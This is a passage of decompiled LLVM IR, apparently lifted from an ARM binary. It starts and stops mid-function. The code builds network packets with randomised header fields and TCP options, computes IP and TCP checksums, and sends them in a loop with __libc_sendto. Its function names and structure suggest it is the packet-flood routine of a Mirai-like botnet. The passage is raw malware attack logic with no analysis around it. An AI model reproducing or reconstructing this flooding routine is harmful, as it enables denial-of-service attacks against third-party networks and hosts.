  %v3_a870 = load i32, i32* %v2_a870, align 4
  store i32 %v3_a870, i32* %r3.global-to-local, align 4
  store i32 %v4_a874, i32* %r0.global-to-local, align 4
  %v2_a87c = load i32, i32* %r4.global-to-local, align 4
  %v3_a87c = add i32 %v2_a87c, 2
  %v4_a87c = inttoptr i32 %v3_a87c to i16*
  store i16 15360, i16* %v4_a87c, align 2
  %v0_a880 = load i32, i32* %r3.global-to-local, align 4
  %v1_a880 = load i32, i32* %r4.global-to-local, align 4
  %v2_a880 = add i32 %v1_a880, 16
  %v3_a880 = inttoptr i32 %v2_a880 to i32*
  store i32 %v0_a880, i32* %v3_a880, align 4
  %v0_a884 = load i32, i32* %r0.global-to-local, align 4
  %v1_a884 = trunc i32 %v0_a884 to i16
  %v2_a884 = load i32, i32* %r4.global-to-local, align 4
  %v3_a884 = add i32 %v2_a884, 20
  %v4_a884 = inttoptr i32 %v3_a884 to i16*
  store i16 %v1_a884, i16* %v4_a884, align 2
  %v0_a888 = load i32, i32* %r4.global-to-local, align 4
  %v1_a888 = add i32 %v0_a888, 20
  store i32 %v1_a888, i32* %r1.global-to-local, align 4
  %v1_a88c = add i32 %v0_a888, 32
  %v2_a88c = inttoptr i32 %v1_a88c to i8*
  %v3_a88c = load i8, i8* %v2_a88c, align 1
  %v4_a88c = zext i8 %v3_a88c to i32
  store i32 %v4_a88c, i32* %r3.global-to-local, align 4
  %v1_a890 = add i32 %v0_a888, 33
  %v2_a890 = inttoptr i32 %v1_a890 to i8*
  %v3_a890 = load i8, i8* %v2_a890, align 1
  %v4_a890 = zext i8 %v3_a890 to i32
  store i32 %v1_a79c, i32* %r0.global-to-local, align 4
  %v1_a898 = urem i8 %v3_a88c, 16
  %v1_a89c = or i8 %v1_a898, -96
  %v1_a8a0 = and i32 %v4_a890, 223
  store i32 %v1_a8a0, i32* %r2.global-to-local, align 4
  store i8 %v1_a89c, i8* %v2_a88c, align 1
  %v0_a8a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a8a8 = load i32, i32* %r0.global-to-local, align 4
  %v4_a8a8 = mul i32 %v1_a8a8, 32
  %v5_a8a8 = or i32 %v4_a8a8, %v0_a8a8
  store i32 %v5_a8a8, i32* %r2.global-to-local, align 4
  store i32 %v5_a7a8, i32* %r0.global-to-local, align 4
  store i32 %v6_a8b0, i32* %r3.global-to-local, align 4
  %v1_a8b4 = trunc i32 %v5_a8a8 to i8
  %v2_a8b4 = load i32, i32* %r1.global-to-local, align 4
  %v3_a8b4 = add i32 %v2_a8b4, 13
  %v4_a8b4 = inttoptr i32 %v3_a8b4 to i8*
  store i8 %v1_a8b4, i8* %v4_a8b4, align 1
  %v0_a8b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_a8b8 = trunc i32 %v0_a8b8 to i16
  %v2_a8b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_a8b8 = add i32 %v2_a8b8, 2
  %v4_a8b8 = inttoptr i32 %v3_a8b8 to i16*
  store i16 %v1_a8b8, i16* %v4_a8b8, align 2
  %v0_a8bc = load i32, i32* %r1.global-to-local, align 4
  %v1_a8bc = add i32 %v0_a8bc, 13
  %v2_a8bc = inttoptr i32 %v1_a8bc to i8*
  %v3_a8bc = load i8, i8* %v2_a8bc, align 1
  %v4_a8bc = zext i8 %v3_a8bc to i32
  store i32 %v1_a7bc, i32* %r2.global-to-local, align 4
  %v1_a8c4 = and i32 %v4_a8bc, 239
  %v5_a8c8 = or i32 %v1_a8c4, %v4_a8c8
  store i32 %v5_a8c8, i32* %r3.global-to-local, align 4
  %v0_a8cc = load i32, i32* %r0.global-to-local, align 4
  %v2_a8cc = add i32 %v0_a8bc, 4
  %v3_a8cc = inttoptr i32 %v2_a8cc to i32*
  store i32 %v0_a8cc, i32* %v3_a8cc, align 4
  %v0_a8d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a8d0 = trunc i32 %v0_a8d0 to i8
  %v2_a8d0 = load i32, i32* %r1.global-to-local, align 4
  %v3_a8d0 = add i32 %v2_a8d0, 13
  %v4_a8d0 = inttoptr i32 %v3_a8d0 to i8*
  store i8 %v1_a8d0, i8* %v4_a8d0, align 1
  %v0_a8d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_a8d4 = add i32 %v0_a8d4, 13
  %v2_a8d4 = inttoptr i32 %v1_a8d4 to i8*
  %v3_a8d4 = load i8, i8* %v2_a8d4, align 1
  %v4_a8d4 = zext i8 %v3_a8d4 to i32
  store i32 %v1_a7c0, i32* %r3.global-to-local, align 4
  %v1_a8dc = and i32 %v4_a8d4, 247
  %v5_a8e0 = or i32 %v1_a8dc, %v4_a8e0
  store i32 %v5_a8e0, i32* %r2.global-to-local, align 4
  %v1_a8e4 = trunc i32 %v5_a8e0 to i8
  store i8 %v1_a8e4, i8* %v2_a8d4, align 1
  %v0_a8e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_a8e8 = add i32 %v0_a8e8, 13
  %v2_a8e8 = inttoptr i32 %v1_a8e8 to i8*
  %v3_a8e8 = load i8, i8* %v2_a8e8, align 1
  %v4_a8e8 = zext i8 %v3_a8e8 to i32
  store i32 %v1_a7c4, i32* %r0.global-to-local, align 4
  %v1_a8f0 = and i32 %v4_a8e8, 251
  %v5_a8f4 = or i32 %v1_a8f0, %v4_a8f4
  store i32 %v5_a8f4, i32* %r3.global-to-local, align 4
  %v1_a8f8 = trunc i32 %v5_a8f4 to i8
  store i8 %v1_a8f8, i8* %v2_a8e8, align 1
  %v0_a8fc = load i32, i32* %r1.global-to-local, align 4
  %v1_a8fc = add i32 %v0_a8fc, 13
  %v2_a8fc = inttoptr i32 %v1_a8fc to i8*
  %v3_a8fc = load i8, i8* %v2_a8fc, align 1
  %v4_a8fc = zext i8 %v3_a8fc to i32
  store i32 %v1_a7c8, i32* %r3.global-to-local, align 4
  %v1_a904 = and i32 %v4_a8fc, 253
  %v4_a908 = or i32 %v1_a904, %v3_a908
  store i32 %v4_a908, i32* %r2.global-to-local, align 4
  %v1_a90c = trunc i32 %v4_a908 to i8
  store i8 %v1_a90c, i8* %v2_a8fc, align 1
  %v0_a910 = load i32, i32* %r1.global-to-local, align 4
  %v1_a910 = add i32 %v0_a910, 13
  %v2_a910 = inttoptr i32 %v1_a910 to i8*
  %v3_a910 = load i8, i8* %v2_a910, align 1
  %v4_a910 = zext i8 %v3_a910 to i32
  store i32 %v1_a7cc, i32* %r0.global-to-local, align 4
  %v1_a918 = and i32 %v4_a910, 254
  %v2_a91c = or i32 %v1_a918, %v1_a7cc
  store i32 %v2_a91c, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 4, i32* @r6, align 4
  %v1_a928 = trunc i32 %v2_a91c to i8
  store i8 %v1_a928, i8* %v2_a910, align 1
  %v0_a92c = load i32, i32* @r5, align 4
  %v1_a92c = trunc i32 %v0_a92c to i8
  %v2_a92c = load i32, i32* %r4.global-to-local, align 4
  %v3_a92c = add i32 %v2_a92c, 40
  %v4_a92c = inttoptr i32 %v3_a92c to i8*
  store i8 %v1_a92c, i8* %v4_a92c, align 1
  %v0_a930 = load i32, i32* @r6, align 4
  %v1_a930 = trunc i32 %v0_a930 to i8
  %v2_a930 = load i32, i32* %r4.global-to-local, align 4
  %v3_a930 = add i32 %v2_a930, 41
  %v4_a930 = inttoptr i32 %v3_a930 to i8*
  store i8 %v1_a930, i8* %v4_a930, align 1
  %v0_a934 = call i32 @rand_next()
  %v1_a938 = urem i32 %v0_a934, 16
  %v1_a93c = or i32 %v1_a938, 1392
  %v1_a940 = add nuw nsw i32 %v1_a93c, 8
  %v3_a944 = mul nuw nsw i32 %v1_a940, 65536
  store i32 %v3_a944, i32* %r0.global-to-local, align 4
  %v3_a948 = mul nuw nsw i32 %v1_a940, 256
  %v5_a950 = or i32 %v3_a948, 5
  %v1_a954 = trunc i32 %v5_a950 to i16
  %v2_a954 = load i32, i32* %r4.global-to-local, align 4
  %v3_a954 = add i32 %v2_a954, 42
  %v4_a954 = inttoptr i32 %v3_a954 to i16*
  store i16 %v1_a954, i16* %v4_a954, align 2
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_a960 = load i32, i32* %r4.global-to-local, align 4
  %v3_a960 = add i32 %v2_a960, 46
  %v4_a960 = inttoptr i32 %v3_a960 to i8*
  store i8 8, i8* %v4_a960, align 1
  %v0_a964 = load i32, i32* %r2.global-to-local, align 4
  %v1_a964 = trunc i32 %v0_a964 to i8
  %v2_a964 = load i32, i32* %r4.global-to-local, align 4
  %v3_a964 = add i32 %v2_a964, 47
  %v4_a964 = inttoptr i32 %v3_a964 to i8*
  store i8 %v1_a964, i8* %v4_a964, align 1
  %v0_a968 = load i32, i32* @r6, align 4
  %v1_a968 = trunc i32 %v0_a968 to i8
  %v2_a968 = load i32, i32* %r4.global-to-local, align 4
  %v3_a968 = add i32 %v2_a968, 44
  %v4_a968 = inttoptr i32 %v3_a968 to i8*
  store i8 %v1_a968, i8* %v4_a968, align 1
  %v0_a96c = load i32, i32* @r5, align 4
  %v1_a96c = trunc i32 %v0_a96c to i8
  %v2_a96c = load i32, i32* %r4.global-to-local, align 4
  %v3_a96c = add i32 %v2_a96c, 45
  %v4_a96c = inttoptr i32 %v3_a96c to i8*
  store i8 %v1_a96c, i8* %v4_a96c, align 1
  %v0_a970 = call i32 @rand_next()
  store i32 %v0_a970, i32* %r0.global-to-local, align 4
  %v2_a978 = load i32, i32* %r4.global-to-local, align 4
  %v3_a978 = add i32 %v2_a978, 59
  %v4_a978 = inttoptr i32 %v3_a978 to i8*
  store i8 6, i8* %v4_a978, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_a988 = load i32, i32* %r4.global-to-local, align 4
  %v2_a988 = add i32 %v1_a988, 48
  %v3_a988 = inttoptr i32 %v2_a988 to i32*
  store i32 %v0_a970, i32* %v3_a988, align 4
  %v0_a98c = load i32, i32* %r3.global-to-local, align 4
  %v1_a98c = load i32, i32* %r4.global-to-local, align 4
  %v2_a98c = add i32 %v1_a98c, 52
  %v3_a98c = inttoptr i32 %v2_a98c to i32*
  store i32 %v0_a98c, i32* %v3_a98c, align 4
  %v0_a990 = load i32, i32* %r2.global-to-local, align 4
  %v1_a990 = trunc i32 %v0_a990 to i8
  %v2_a990 = load i32, i32* %r4.global-to-local, align 4
  %v3_a990 = add i32 %v2_a990, 56
  %v4_a990 = inttoptr i32 %v3_a990 to i8*
  store i8 %v1_a990, i8* %v4_a990, align 1
  %v0_a994 = load i32, i32* %r1.global-to-local, align 4
  %v1_a994 = trunc i32 %v0_a994 to i8
  %v2_a994 = load i32, i32* %r4.global-to-local, align 4
  %v3_a994 = add i32 %v2_a994, 58
  %v4_a994 = inttoptr i32 %v3_a994 to i8*
  store i8 %v1_a994, i8* %v4_a994, align 1
  %v0_a998 = load i32, i32* %r1.global-to-local, align 4
  %v1_a998 = trunc i32 %v0_a998 to i8
  %v2_a998 = load i32, i32* %r4.global-to-local, align 4
  %v3_a998 = add i32 %v2_a998, 57
  %v4_a998 = inttoptr i32 %v3_a998 to i8*
  store i8 %v1_a998, i8* %v4_a998, align 1
  %v3_a99c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a99c, i32* %r3.global-to-local, align 4
  %v1_a9a0 = load i32, i32* %r2.global-to-local, align 4
  %v2_a9a0 = add i32 %v1_a9a0, %v3_a99c
  store i32 %v2_a9a0, i32* @r4, align 4
  %v1_a9a4 = load i32, i32* @sb, align 4
  %v9_a9a4 = icmp eq i32 %v2_a9a0, %v1_a9a4
  store i1 %v9_a9a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_a9a0, i32* %stack_var_-44, align 4
  %v5_a9ac = icmp slt i32 %v2_a9a0, %v1_a9a4
  br i1 %v5_a9ac, label %dec_label_pc_a7f4, label %dec_label_pc_a9b0.preheader

dec_label_pc_a9b0.preheader:                      ; preds = %.thread, %dec_label_pc_a720
  %v0_a9b410 = phi i32 [ 0, %dec_label_pc_a720 ], [ %v1_a9a4, %.thread ]
  %v2_a9cc = icmp eq i32 %v6_a6c4, -1
  %v7_a9cc = icmp eq i32 %v6_a6c4, -1
  %v3_a9e0 = icmp eq i32 %v3_a740, 65535
  br label %dec_label_pc_a9b0

dec_label_pc_a9b0:                                ; preds = %dec_label_pc_abac.dec_label_pc_a9b0_crit_edge, %dec_label_pc_a9b0.preheader
  %v0_a9b4 = phi i32 [ %v0_a9b4.pre, %dec_label_pc_abac.dec_label_pc_a9b0_crit_edge ], [ %v0_a9b410, %dec_label_pc_a9b0.preheader ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a9b4 = icmp eq i32 %v0_a9b4, 0
  store i1 %v2_a9b4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a9b4, label %dec_label_pc_abac, label %dec_label_pc_a9c0

dec_label_pc_a9c0:                                ; preds = %dec_label_pc_a9b0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_aaa4

dec_label_pc_a9c8:                                ; preds = %dec_label_pc_aaa4
  store i32 %v6_a6c4, i32* %r3.global-to-local, align 4
  store i1 %v7_a9cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a9cc, label %dec_label_pc_ab24, label %dec_label_pc_a9d4

dec_label_pc_a9d4:                                ; preds = %dec_label_pc_aac4, %dec_label_pc_a9c8
  store i32 %v3_a740, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_a9e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a9e0, label %dec_label_pc_ab40, label %dec_label_pc_a9e8

dec_label_pc_a9e8:                                ; preds = %dec_label_pc_ab24, %dec_label_pc_a9d4
  %v1_a9ec = phi i32 [ %v1_ab34, %dec_label_pc_ab24 ], [ 65535, %dec_label_pc_a9d4 ]
  store i32 %v3_a744, i32* %r1.global-to-local, align 4
  %v9_a9ec = icmp eq i32 %v3_a744, %v1_a9ec
  store i1 %v9_a9ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a9ec, label %dec_label_pc_ab54, label %dec_label_pc_a9f4

dec_label_pc_a9f4:                                ; preds = %dec_label_pc_ab40.dec_label_pc_a9f4_crit_edge, %dec_label_pc_a9e8
  %v1_a9f8 = phi i32 [ %v1_a9f8.pre, %dec_label_pc_ab40.dec_label_pc_a9f4_crit_edge ], [ %v1_a9ec, %dec_label_pc_a9e8 ]
  store i32 %v3_a748, i32* %r2.global-to-local, align 4
  %v9_a9f8 = icmp eq i32 %v3_a748, %v1_a9f8
  store i1 %v9_a9f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a9f8, label %dec_label_pc_ab68, label %dec_label_pc_aa00

dec_label_pc_aa00:                                ; preds = %dec_label_pc_ab54.dec_label_pc_aa00_crit_edge, %dec_label_pc_a9f4
  %v1_aa04 = phi i32 [ %v1_aa04.pre, %dec_label_pc_ab54.dec_label_pc_aa00_crit_edge ], [ %v1_a9f8, %dec_label_pc_a9f4 ]
  store i32 %v6_a600, i32* %r3.global-to-local, align 4
  %v9_aa04 = icmp eq i32 %v6_a600, %v1_aa04
  store i1 %v9_aa04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aa04, label %dec_label_pc_ab7c, label %dec_label_pc_aa0c

dec_label_pc_aa0c:                                ; preds = %dec_label_pc_ab68.dec_label_pc_aa0c_crit_edge, %dec_label_pc_aa00
  %v1_aa10 = phi i32 [ %v1_aa10.pre, %dec_label_pc_ab68.dec_label_pc_aa0c_crit_edge ], [ %v1_aa04, %dec_label_pc_aa00 ]
  store i32 %v6_a618, i32* %r0.global-to-local, align 4
  %v9_aa10 = icmp eq i32 %v6_a618, %v1_aa10
  store i1 %v9_aa10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aa10, label %dec_label_pc_ab90, label %dec_label_pc_aa18

dec_label_pc_aa18:                                ; preds = %dec_label_pc_ab7c, %dec_label_pc_aa0c
  %v0_aa18 = load i32, i32* @fp, align 4
  %v2_aa18 = icmp eq i32 %v0_aa18, 0
  store i1 %v2_aa18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aa18, label %dec_label_pc_aa20, label %dec_label_pc_aba0

dec_label_pc_aa20:                                ; preds = %dec_label_pc_aa18, %dec_label_pc_ab90, %dec_label_pc_aba0
  %v2_aa24 = load i32, i32* @r5, align 4
  %v3_aa24 = add i32 %v2_aa24, 10
  %v4_aa24 = inttoptr i32 %v3_aa24 to i16*
  store i16 0, i16* %v4_aa24, align 2
  %v0_aa28 = load i32, i32* @r5, align 4
  store i32 %v0_aa28, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_aa30 = call i32 @checksum_generic(i32 %v0_aa28, i32 20)
  %v3_aa30 = trunc i32 %v2_aa30 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_aa38 = load i32, i32* @r5, align 4
  %v4_aa38 = add i32 %v3_aa38, 10
  %v5_aa38 = inttoptr i32 %v4_aa38 to i16*
  store i16 %v3_aa30, i16* %v5_aa38, align 2
  %v0_aa3c = load i32, i32* @r6, align 4
  store i32 %v0_aa3c, i32* @r1, align 4
  %v0_aa40 = load i32, i32* %r2.global-to-local, align 4
  %v1_aa40 = trunc i32 %v0_aa40 to i16
  %v3_aa40 = add i32 %v0_aa3c, 16
  %v4_aa40 = inttoptr i32 %v3_aa40 to i16*
  store i16 %v1_aa40, i16* %v4_aa40, align 2
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_aa4c = load i32, i32* @r5, align 4
  store i32 %v0_aa4c, i32* %r0.global-to-local, align 4
  %v4_aa50 = call i32 @checksum_tcpudp(i32 %v0_aa4c, i32 %v0_aa3c, i32 10240, i32 40)
  %v5_aa50 = trunc i32 %v4_aa50 to i16
  store i32 %v4_aa50, i32* %r0.global-to-local, align 4
  %v3_aa54 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_aa54, i32* %r3.global-to-local, align 4
  %v3_aa58 = mul i32 %v3_aa54, 32
  store i32 %v3_aa58, i32* %lr.global-to-local, align 4
  %v3_aa5c = load i32, i32* @r6, align 4
  %v4_aa5c = add i32 %v3_aa5c, 16
  %v5_aa5c = inttoptr i32 %v4_aa5c to i16*
  store i16 %v5_aa50, i16* %v5_aa5c, align 2
  %v0_aa60 = load i32, i32* %lr.global-to-local, align 4
  %v1_aa60 = load i32, i32* %r3.global-to-local, align 4
  %tmp70 = mul i32 %v1_aa60, -8
  %v5_aa60 = add i32 %v0_aa60, %tmp70
  store i32 %v5_aa60, i32* %lr.global-to-local, align 4
  %v0_aa64 = load i32, i32* @r6, align 4
  %v1_aa64 = add i32 %v0_aa64, 2
  %v2_aa64 = inttoptr i32 %v1_aa64 to i16*
  %v3_aa64 = load i16, i16* %v2_aa64, align 2
  %v4_aa64 = zext i16 %v3_aa64 to i32
  store i32 %v4_aa64, i32* @r6, align 4
  %v1_aa68 = load i32, i32* @r7, align 4
  %v2_aa68 = add i32 %v1_aa68, %v5_aa60
  store i32 %v2_aa68, i32* @lr, align 4
  %v3_aa6c = add i32 %v2_aa68, 2
  %v4_aa6c = inttoptr i32 %v3_aa6c to i16*
  store i16 %v3_aa64, i16* %v4_aa6c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_aa78 = load i32, i32* @r5, align 4
  store i32 %v0_aa78, i32* %r1.global-to-local, align 4
  %v0_aa7c = load i32, i32* @r8, align 4
  store i32 %v0_aa7c, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  %v0_aa84 = load i32, i32* @lr, align 4
  %v6_aa8c = call i32 @__libc_sendto(i32 %v0_aa7c, i32 %v0_aa78, i32 60, i32 16384, i32 %v0_aa84, i32 16)
  %v3_aa90 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_aa90, i32* %r3.global-to-local, align 4
  %v1_aa94 = add i32 %v3_aa90, 1
  store i32 %v1_aa94, i32* %r0.global-to-local, align 4
  %v1_aa98 = load i32, i32* @sb, align 4
  %v9_aa98 = icmp eq i32 %v1_aa94, %v1_aa98
  store i1 %v9_aa98, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_aa94, i32* %stack_var_-44, align 4
  %v6_aaa0 = icmp slt i32 %v1_aa94, %v1_aa98
  br i1 %v6_aaa0, label %dec_label_pc_aaa4, label %dec_label_pc_abac

dec_label_pc_aaa4:                                ; preds = %dec_label_pc_aa20, %dec_label_pc_a9c0
  %v1_aab4 = phi i32 [ %v1_aa94, %dec_label_pc_aa20 ], [ 0, %dec_label_pc_a9c0 ]
  %v5_aaa8 = mul i32 %v1_aab4, 24
  %v1_aaac = load i32, i32* @r7, align 4
  %v2_aaac = add i32 %v1_aaac, %v5_aaa8
  store i32 %v2_aaac, i32* %r3.global-to-local, align 4
  %v1_aab0 = add i32 %v2_aaac, 20
  %v2_aab0 = inttoptr i32 %v1_aab0 to i8*
  %v3_aab0 = load i8, i8* %v2_aab0, align 1
  %v4_aab0 = zext i8 %v3_aab0 to i32
  store i32 %v4_aab0, i32* %r2.global-to-local, align 4
  %v0_aab4 = load i32, i32* @sl, align 4
  %v4_aab4 = mul i32 %v1_aab4, 4
  %v5_aab4 = add i32 %v0_aab4, %v4_aab4
  %v6_aab4 = inttoptr i32 %v5_aab4 to i32*
  %v7_aab4 = load i32, i32* %v6_aab4, align 4
  store i32 %v7_aab4, i32* @r5, align 4
  %v2_aab8 = icmp ugt i8 %v3_aab0, 30
  %v7_aab8 = icmp eq i8 %v3_aab0, 31
  store i1 %v7_aab8, i1* %cpsr_z.global-to-local, align 1
  %v1_aabc = add i32 %v7_aab4, 20
  store i32 %v1_aabc, i32* @r6, align 4
  %v2_aac0 = xor i1 %v7_aab8, true
  %v3_aac0 = and i1 %v2_aab8, %v2_aac0
  br i1 %v3_aac0, label %dec_label_pc_a9c8, label %dec_label_pc_aac4

dec_label_pc_aac4:                                ; preds = %dec_label_pc_aaa4
  %v1_aac4 = add i32 %v2_aaac, 16
  %v2_aac4 = inttoptr i32 %v1_aac4 to i32*
  %v3_aac4 = load i32, i32* %v2_aac4, align 4
  store i32 %v3_aac4, i32* %r4.global-to-local, align 4
  %v0_aac8 = call i32 @rand_next()
  store i32 %v0_aac8, i32* %r0.global-to-local, align 4
  %v3_aacc = load i32, i32* %stack_var_-44, align 4
  %v5_aad4 = mul i32 %v3_aacc, 24
  %v0_aad8 = load i32, i32* %r4.global-to-local, align 4
  %v1_aad8 = and i32 %v0_aad8, 16711680
  %v3_aadc = udiv i32 %v0_aad8, 16777216
  %v4_aae0 = udiv i32 %v1_aad8, 256
  %v5_aae0 = or i32 %v4_aae0, %v3_aadc
  store i32 %v5_aae0, i32* %r2.global-to-local, align 4
  %v1_aae4 = load i32, i32* @r7, align 4
  %v2_aae4 = add i32 %v1_aae4, %v5_aad4
  store i32 %v2_aae4, i32* %r1.global-to-local, align 4
  %v1_aae8 = and i32 %v0_aad8, 65280
  store i32 %v1_aae8, i32* %r3.global-to-local, align 4
  %v1_aaec = add i32 %v2_aae4, 20
  %v2_aaec = inttoptr i32 %v1_aaec to i8*
  %v3_aaec = load i8, i8* %v2_aaec, align 1
  %v4_aaec = zext i8 %v3_aaec to i32
  %v5_aaf4 = call i32 @llvm.bswap.i32(i32 %v0_aad8)
  %v7_aaf8 = lshr i32 %v0_aac8, %v4_aaec
  %v8_aaf8 = add i32 %v7_aaf8, %v5_aaf4
  store i32 %v8_aaf8, i32* %r2.global-to-local, align 4
  %v1_aafc = and i32 %v8_aaf8, 16711680
  store i32 %v1_aafc, i32* %r0.global-to-local, align 4
  %v1_ab08 = and i32 %v8_aaf8, 65280
  store i32 %v1_ab08, i32* %r1.global-to-local, align 4
  %v5_ab10 = call i32 @llvm.bswap.i32(i32 %v8_aaf8)
  %v1_ab14 = load i32, i32* @r5, align 4
  %v2_ab14 = add i32 %v1_ab14, 16
  %v3_ab14 = inttoptr i32 %v2_ab14 to i32*
  store i32 %v5_ab10, i32* %v3_ab14, align 4
  store i32 %v6_a6c4, i32* %r3.global-to-local, align 4
  store i1 %v7_a9cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a9cc, label %dec_label_pc_ab24, label %dec_label_pc_a9d4

dec_label_pc_ab24:                                ; preds = %dec_label_pc_aac4, %dec_label_pc_a9c8
  %v0_ab24 = call i32 @rand_next()
  store i32 65536, i32* %r4.global-to-local, align 4
  %v1_ab2c = load i32, i32* @r5, align 4
  %v2_ab2c = add i32 %v1_ab2c, 12
  %v3_ab2c = inttoptr i32 %v2_ab2c to i32*
  store i32 %v0_ab24, i32* %v3_ab2c, align 4
  store i32 %v3_a740, i32* %r0.global-to-local, align 4
  %v0_ab34 = load i32, i32* %r4.global-to-local, align 4
  %v1_ab34 = add i32 %v0_ab34, -1
  store i32 %v1_ab34, i32* @r4, align 4
  %v9_ab38 = icmp eq i32 %v3_a740, %v1_ab34
  store i1 %v9_ab38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ab38, label %dec_label_pc_ab40, label %dec_label_pc_a9e8

dec_label_pc_ab40:                                ; preds = %dec_label_pc_ab24, %dec_label_pc_a9d4
  %v0_ab40 = call i32 @rand_next()
  %v1_ab40 = trunc i32 %v0_ab40 to i16
  store i32 %v0_ab40, i32* %r0.global-to-local, align 4
  store i32 %v3_a744, i32* %r1.global-to-local, align 4
  %v1_ab48 = load i32, i32* @r4, align 4
  %v9_ab48 = icmp eq i32 %v3_a744, %v1_ab48
  store i1 %v9_ab48, i1* %cpsr_z.global-to-local, align 1
  %v3_ab4c = load i32, i32* @r5, align 4
  %v4_ab4c = add i32 %v3_ab4c, 4
  %v5_ab4c = inttoptr i32 %v4_ab4c to i16*
  store i16 %v1_ab40, i16* %v5_ab4c, align 2
  br i1 %v9_ab48, label %dec_label_pc_ab54, label %dec_label_pc_ab40.dec_label_pc_a9f4_crit_edge

dec_label_pc_ab40.dec_label_pc_a9f4_crit_edge:    ; preds = %dec_label_pc_ab40
  %v1_a9f8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a9f4

dec_label_pc_ab54:                                ; preds = %dec_label_pc_ab40, %dec_label_pc_a9e8
  %v0_ab54 = call i32 @rand_next()
  %v1_ab54 = trunc i32 %v0_ab54 to i16
  store i32 %v0_ab54, i32* %r0.global-to-local, align 4
  store i32 %v3_a748, i32* %r2.global-to-local, align 4
  %v1_ab5c = load i32, i32* @r4, align 4
  %v9_ab5c = icmp eq i32 %v3_a748, %v1_ab5c
  store i1 %v9_ab5c, i1* %cpsr_z.global-to-local, align 1
  %v3_ab60 = load i32, i32* @r5, align 4
  %v4_ab60 = add i32 %v3_ab60, 20
  %v5_ab60 = inttoptr i32 %v4_ab60 to i16*
  store i16 %v1_ab54, i16* %v5_ab60, align 2
  br i1 %v9_ab5c, label %dec_label_pc_ab68, label %dec_label_pc_ab54.dec_label_pc_aa00_crit_edge

dec_label_pc_ab54.dec_label_pc_aa00_crit_edge:    ; preds = %dec_label_pc_ab54
  %v1_aa04.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_aa00

dec_label_pc_ab68:                                ; preds = %dec_label_pc_ab54, %dec_label_pc_a9f4
  %v0_ab68 = call i32 @rand_next()
  %v1_ab68 = trunc i32 %v0_ab68 to i16
  store i32 %v0_ab68, i32* %r0.global-to-local, align 4
  store i32 %v6_a600, i32* %r3.global-to-local, align 4
  %v1_ab70 = load i32, i32* @r4, align 4
  %v9_ab70 = icmp eq i32 %v6_a600, %v1_ab70
  store i1 %v9_ab70, i1* %cpsr_z.global-to-local, align 1
  %v3_ab74 = load i32, i32* @r6, align 4
  %v4_ab74 = add i32 %v3_ab74, 2
  %v5_ab74 = inttoptr i32 %v4_ab74 to i16*
  store i16 %v1_ab68, i16* %v5_ab74, align 2
  br i1 %v9_ab70, label %dec_label_pc_ab7c, label %dec_label_pc_ab68.dec_label_pc_aa0c_crit_edge

dec_label_pc_ab68.dec_label_pc_aa0c_crit_edge:    ; preds = %dec_label_pc_ab68
  %v1_aa10.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_aa0c

dec_label_pc_ab7c:                                ; preds = %dec_label_pc_ab68, %dec_label_pc_aa00
  %v0_ab7c = call i32 @rand_next()
  %v1_ab80 = load i32, i32* @r6, align 4
  %v2_ab80 = add i32 %v1_ab80, 4
  %v3_ab80 = inttoptr i32 %v2_ab80 to i32*
  store i32 %v0_ab7c, i32* %v3_ab80, align 4
  store i32 %v6_a618, i32* %r0.global-to-local, align 4
  %v1_ab88 = load i32, i32* @r4, align 4
  %v9_ab88 = icmp eq i32 %v6_a618, %v1_ab88
  store i1 %v9_ab88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ab88, label %dec_label_pc_ab90, label %dec_label_pc_aa18

dec_label_pc_ab90:                                ; preds = %dec_label_pc_ab7c, %dec_label_pc_aa0c
  %v0_ab90 = call i32 @rand_next()
  store i32 %v0_ab90, i32* %r0.global-to-local, align 4
  %v0_ab94 = load i32, i32* @fp, align 4
  %v2_ab94 = icmp eq i32 %v0_ab94, 0
  store i1 %v2_ab94, i1* %cpsr_z.global-to-local, align 1
  %v1_ab98 = load i32, i32* @r6, align 4
  %v2_ab98 = add i32 %v1_ab98, 8
  %v3_ab98 = inttoptr i32 %v2_ab98 to i32*
  store i32 %v0_ab90, i32* %v3_ab98, align 4
  br i1 %v2_ab94, label %dec_label_pc_aa20, label %dec_label_pc_aba0

dec_label_pc_aba0:                                ; preds = %dec_label_pc_aa18, %dec_label_pc_ab90
